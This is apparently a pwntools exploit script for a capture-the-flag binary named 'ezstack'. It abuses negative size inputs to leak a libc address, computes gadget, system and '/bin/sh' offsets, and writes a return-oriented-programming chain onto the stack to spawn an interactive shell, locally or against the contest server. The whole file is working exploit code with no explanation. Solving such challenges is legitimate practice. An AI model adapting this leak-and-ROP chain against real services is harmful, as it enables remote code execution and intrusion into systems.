from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './ezstack'
HOST = 'ezstack.ctf.jyoken.net'
PORT = 80

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


r = start()
if args.D:
    debug(r, [0xc45])

r.sendlineafter('> ', '2')
r.sendlineafter('size: ', str(-320+0x8))

r.sendlineafter('> ', '2')
r.sendlineafter('size: ', str(8))
r.recv(4)
leak = u64(r.recv(6)+'\x00\x00')
dbg("leak")
base = leak - 0x21b97
dbg("base")

rdi = base + 0x0002155f
system = base + 0x4f440
binsh = base + 0x1b3e9a

r.sendlineafter('> ', '2')
r.sendlineafter('size: ', str(304))

payload = ''
payload += p64(rdi+1) * (0xd0/8)
payload += flat(rdi, binsh, rdi+1,  system)

r.sendlineafter('> ', '1')
r.sendlineafter('data: ', payload)

r.sendlineafter('> ', '2')
r.sendlineafter('size: ', str(-320+0xf0+0x40-8))

r.sendlineafter('> ', '1')
r.sendlineafter('> ', '3')

r.interactive()
r.close()
